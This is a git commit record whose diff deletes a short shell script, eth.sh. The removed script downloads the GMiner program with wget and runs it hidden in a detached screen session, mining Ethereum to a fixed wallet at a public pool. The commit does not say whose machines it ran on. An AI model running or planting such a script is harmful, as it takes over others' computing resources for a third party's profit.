c7698676451dca9b0e7406934bc14aa60901629d
backendbox <contact@backendbox.net>
2021-09-11 21:20:56 +0700

    Delete eth.sh

--- eth.sh
+++
@@ -1,5 +0,0 @@
-#!/bin/bash
-ID=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13 ; echo '')
-wget https://github.com/develsoftware/GMinerRelease/releases/download/2.63/gminer_2_63_linux64.tar.xz
-tar xvf gminer_2_63_linux64.tar.xz
-screen -dmLS mine ./miner --algo ethash --server eth.2miners.com:2020 --user 0xd303C4bce0266AA8bD2783914659023148e60e49.$ID
